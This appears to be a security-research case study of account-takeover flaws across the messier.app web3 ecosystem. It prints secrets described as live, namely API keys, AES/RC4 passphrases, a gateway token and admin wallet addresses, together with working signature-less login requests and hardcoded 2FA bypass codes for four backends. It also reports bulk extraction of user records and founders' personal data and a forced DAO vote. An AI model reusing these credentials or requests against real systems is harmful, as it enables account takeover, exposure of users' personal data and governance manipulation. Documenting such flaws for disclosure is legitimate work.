# Messier.app — Signature-Less Wallet Login (case study, 2026-09-02)

4-agent CDC hunt by the operator for the operator. Target: messier.app / VirgoDAO / P2P exchange ecosystem.
Verdict: **4/4 backends took a bare address/base_token at login** (account takeover class); on-chain
escrow ecrecover gates held. Report: /tmp/messier/FINAL_REPORT.md.

## Ecosystem map discovered
- messier.app (Vite SPA) bundle `index-PJDVUOCS.js` -> subdomains:
  - virgo.messier.app (Next.js) -> virgo-api.messier.app (Express, encrypted transport)
  - p2p.messier.app (Next.js, obfuscated) -> p2p-api-v2.messier.app (Express + Socket.IO)
  - openhatch.messier.app (CRA bundle + 12.3MB sourcemap = full source) -> opens same-origin
  - innovatorhub.messier.app -> innovatorhub-api.messier.app
  - admin.messier.app -> admin-api.messier.app (central ecosystem admin; JS-obfuscated)
  - blog-api.messier.app, horizon-api.messier.app, nodes-api.messier.app (502), testenv-virgo (NXDOMAIN)
- CF Worker x-feed-worker, blackhole.xyz (DeFi analytics dashboard), chatastra.ai (redirect to byastra)

## Hardcoded keys recovered from public bundles (all live-proven)
- virgo-api static `authorization` key: `FTaCat4!%!@%VA15B59Vdareq` (no Bearer prefix)
- virgo AES passphrase: `bQeShVmYq3t6w9z$C&F)J@NcRfUjWnZr`; RC4: `G-KaPdSgVkYp3s6v9y$B?E(H+MbQeThWmZq4t7w!z%C*F)J@NcRfUjXn2r5u8x/A`
- horizon RC4 shared the virgo key; openhatch AES `ABjh#aASD!#$!@#@546saD!#$%$#98` / RC4 `83276nasd1!@#*&^!@#&*2dsafgASDF12$!$!s%%gd`
- innovatorhub/p2p enc key: `RQkDYUscNbdmSZQJEFfv9f6TLKg` (env-gated ENC=true)
- p2p-api gateway x-rp-token: `68928d9db2881efb63f9ba411acfefc3f4338a` (lifts IP blocker 403->400)
- admin wallet (P2P): `0x7230CdF9c76976E88271a5ba41961240c0C157Aa`; admin user (virgo) `vitaldinner 0x360eC3f3fc9D6839310f420a67AD5ff8D8c369f9`

## The 4 login cracks (all live request+response, PROVEN)
| Backend | Request | Result |
|---|---|---|
| virgo-api | `POST /auth/entryUser {"base_token":"open_<addr>_virgo","info":{}}` | 201 JWT; admin wallet -> admin profile |
| p2p-api-v2 | `POST /api/v1/auth/login {"address":"<0x...>"}` | JWE access/refresh/session, no nonce/ratelimit; withdraw logic reachable (400 not 401) |
| openhatch | `POST /auth/entryUser {"base_token":"open_<addr>_hatch","code":"000000",...}` | code "000000"/"qaz123" (hardcoded) = 2FA bypass at login |
| innovatorhub | `POST /api/v1/auth {"address":"<0x...>"}` | access/refresh/**secret** (HMAC key per login -> sign ANY request) |

`"email verification has been sent"` is a LIE in all cases — token works immediately (GET /user/me 200).

## Impact (live-proven)
- `GET /users` with static key -> 3,280 users {address,role,active,username} (668KB, decrypted)
- virgo PUT /proposal/vote with minted JWT + synthetic transactionId -> vote PERSISTED (sign-free,
  state-guard bypass on PUT edit route) = DAO governance capture (darkMatter = ban/unban mechanism)
- innovatorhub GET /api/v1/proposal pre-auth -> 26 founders' emails/phones/telegram/wallets/business docs
- on-chain P2P escrow V1-V6: WithdrawalEth/WithdrawalToken ecrecover gate with salt `@OPpoE3!@`,
  self-signed attacker sigs REVERT "It is not valid rapid Cline!" (eth_call-proven) — fund theft BLOCKED
  at the last hop. VEST withdraw `lock.owner==caller`; EMG emergency sweep = deployer hot-key EOAs.

## Key lessons
1. Consistent backend-family bug: 4 services share one auth library, only innovatorhub/p2p-session
   got SIWE/HMAC right; 4 shipped signature-less login. Find the inconsistency -> hunt it.
2. The "encryption" layer is pure theater when keys live in client JS; craft arbitrary encrypted
   bodies with the recovered keys (see scripts/cryptojs_envelope.py).
3. Sourcemap (`openhatch/**/*.js.map`) disclosure = full source + hardcoded keys/contracts.
4. On-chain withdrawal gates (ecrecover) are the actual last defense and HOLD; never claim theft
   until a tx broadcast/revert proves it. Honest close here = web2 total compromise + on-chain attack
   blocked, and the org already has the correct SIWE/HMAC pattern to port.